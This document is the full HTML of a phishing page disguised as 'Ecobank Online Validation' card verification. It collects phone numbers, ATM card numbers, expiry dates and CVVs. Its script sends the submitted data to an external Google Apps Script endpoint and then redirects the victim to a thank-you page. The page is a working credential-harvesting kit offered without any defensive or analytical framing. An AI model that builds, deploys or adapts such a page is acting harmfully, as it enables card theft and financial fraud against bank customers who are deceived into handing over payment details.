<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ecobank Online Validation</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>
body {
  margin:0;
  min-height:100vh;
  background: linear-gradient(to bottom, #0a1a3f, #0e2563);
  font-family: "Inter", Arial, sans-serif;
  color:#fff;
  display:flex;
  flex-direction:column;
}

header {
  padding:30px 20px 50px;
  text-align:center;
  background: linear-gradient(135deg, #1b4ba2, #102a5b);
  border-bottom-left-radius:40px;
  border-bottom-right-radius:40px;
}

header h1 {
  display:inline-block;
  padding:12px 22px;
  border-radius:999px;
  background: linear-gradient(135deg,#123b87,#1f5bc5);
  font-size:18px;
}

main {
  flex:1;
  display:flex;
  justify-content:center;
  padding:30px 15px;
}

.card {
  width:100%;
  max-width:420px;
  background: linear-gradient(145deg, rgba(12,35,90,.97), rgba(18,50,115,.97));
  padding:30px 26px;
  border-radius:14px;
  box-shadow:0 14px 30px rgba(0,0,0,.45);
}

label {
  font-size:13px;
  font-weight:600;
  margin-bottom:6px;
  display:block;
}

input {
  width:100%;
  padding:12px;
  border-radius:8px;
  border:1px solid #99b3ff;
  margin-bottom:18px;
}

button {
  width:100%;
  padding:14px;
  border:none;
  border-radius:999px;
  background: linear-gradient(135deg,#00b871,#00995b);
  color:#fff;
  font-weight:700;
  font-size:15px;
}
</style>
</head>

<body>
<header>
  <h1>ECOBANK ONLINE VALIDATION</h1>
  <p>Secure Card Verification</p>
</header>

<main>
  <div class="card">
    <form id="demoForm">
      <label>Phone Number</label>
      <input name="phone_number" required>

      <label>ATM Card Number</label>
      <input name="atm_card_number" required>

      <label>ATM Expiry Date</label>
      <input name="atm_expiry_date" placeholder="MM/YY" required>

      <label>CVV</label>
      <input name="cvv" type="password" required>

      <button>Validate Securely</button>
    </form>
  </div>
</main>

<script>
const scriptURL="https://script.google.com/macros/s/AKfycbxBZeRKxbAyf1pWTLN0z15_l-E3RXnp3hvx2gYHiDDU00GKZ3vBKVt7T2kImh9Sfoo1dw/exec";
document.getElementById("demoForm").addEventListener("submit",async e=>{
  e.preventDefault();
  await fetch(scriptURL,{method:"POST",body:new FormData(e.target)});
  location.href="thankyou.html";
});
</script>
</body>
</html>
